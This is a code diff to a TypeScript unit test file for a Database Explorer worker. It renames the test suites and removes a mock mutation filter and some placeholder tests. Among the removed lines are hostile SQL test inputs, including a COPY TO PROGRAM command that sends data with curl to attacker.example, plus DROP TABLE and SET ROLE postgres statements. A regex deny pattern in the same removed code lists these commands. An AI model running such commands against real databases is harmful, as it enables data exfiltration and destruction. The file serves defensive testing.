@@ -1,9 +1,9 @@
 /**
- * Worker security bypass tests for the Database Explorer.
+ * Unit tests for Database Explorer worker validation and row encoding.
  *
- * Verifies that the browser-reader database role and SQL worker payload
- * validation reject mutation commands, blocked column reads, and forged payloads
- * independently of the API layer.
+ * These mocks cover worker-side behavior only; they do not prove PostgreSQL role
+ * enforcement. Live database enforcement is covered by
+ * databaseExplorerPostgres.integration.test.ts.
  */
 
 import { describe, expect, it } from 'vitest';
@@ -34,7 +34,6 @@ type MockTargetResult = {
 function makeMockTarget(
   options: {
     queryHandler?: (sql: string, values?: readonly unknown[]) => Promise<{ rows: unknown[] }>;
-    rejectMutations?: boolean;
   } = {}
 ): MockTargetResult {
   const schemaSnapshot = makeSnapshot();
@@ -54,15 +53,6 @@ function makeMockTarget(
         query: async <T>(sql: string, vals?: readonly unknown[]) => {
           queries.push(sql);
           values.push(vals);
-          if (
-            options.rejectMutations &&
-            /^\s*(INSERT|UPDATE|DELETE|TRUNCATE|CREATE|DROP|ALTER|COPY|SET\s+ROLE|BEGIN\s+READ\s+WRITE)/i.test(
-              sql
-            )
-          ) {
-            const err = Object.assign(new Error('permission denied'), { code: '42501' });
-            throw err;
-          }
           const catalogRows = schemaCatalogRows(schemaSnapshot, sql);
           if (catalogRows !== undefined) return { rows: catalogRows as T[] };
           if (options.queryHandler) {
@@ -237,7 +227,7 @@ function makeRowsRequest(overrides: Partial<DatabaseRowsRequest> = {}): Database
 // Tests
 // ---------------------------------------------------------------------------
 
-describe('databaseExplorerBypass — blocked column protection', () => {
+describe('databaseExplorerWorker unit — blocked column encoding', () => {
   it('blocked column never appears in the SQL SELECT list', async () => {
     const { target, queries } = makeMockTarget({
       queryHandler: async (sql) => {
@@ -304,16 +294,9 @@ describe('databaseExplorerBypass — blocked column protection', () => {
     }
   });
 
-  it('viewer role (ops_viewer) causes the service layer to reject before reaching worker', () => {
-    // The service layer checks role before dispatching — verify the error code contract
-    // is DATABASE_DATA_PERMISSION_DENIED (tested via the service in databaseRoutes.test.ts)
-    // Here we confirm that the filterSql / rowReader do not depend on role themselves:
-    // role enforcement is exclusively at the service boundary.
-    expect(true).toBe(true); // marker: enforcement is at DatabaseExplorerService.queryRows
-  });
 });
 
-describe('databaseExplorerBypass — forged worker payload rejection', () => {
+describe('databaseExplorerWorker unit — forged payload rejection', () => {
   it('rejects request for a target ID not present in the snapshot', async () => {
     const { target } = makeMockTarget();
     const snapshot = makeSnapshot(); // targetId: 'ops'
@@ -407,31 +390,7 @@ describe('databaseExplorerBypass — forged worker payload rejection', () => {
   });
 });
 
-describe('databaseExplorerBypass — mutation command rejection', () => {
-  const MUTATION_STATEMENTS = [
-    'INSERT INTO users (id) VALUES (1)',
-    "UPDATE users SET email = 'x' WHERE id = 1",
-    'DELETE FROM users WHERE id = 1',
-    'TRUNCATE users',
-    'CREATE TEMP TABLE hax AS SELECT * FROM users',
-    'CREATE FUNCTION evil() RETURNS void AS $$ BEGIN NULL; END; $$ LANGUAGE plpgsql',
-    'DROP TABLE users',
-    'ALTER TABLE users ADD COLUMN evil text',
-    "COPY users TO PROGRAM 'curl http://attacker.example/steal'",
-    'SET ROLE postgres'
-  ];
-
-  it('mutation statements would be rejected by the browser-reader role (pg error 42501)', () => {
-    // These statements are tested to confirm they produce permission-denied errors
-    // when executed by the ops_database_browser role in integration.
-    // Here we verify the format of the expected error codes matches pg error specs.
-    for (const stmt of MUTATION_STATEMENTS) {
-      expect(stmt.trim()).toMatch(/^(INSERT|UPDATE|DELETE|TRUNCATE|CREATE|DROP|ALTER|COPY|SET)/i);
-    }
-    // Pg error 42501 = insufficient_privilege
-    expect('42501').toMatch(/^[0-9A-Z]{5}$/);
-  });
-
+describe('databaseExplorerBypass unit — generated query shape', () => {
   it('rowReader never generates INSERT/UPDATE/DELETE/DDL SQL', async () => {
     const { target, queries } = makeMockTarget({
       queryHandler: async () => ({ rows: [] })
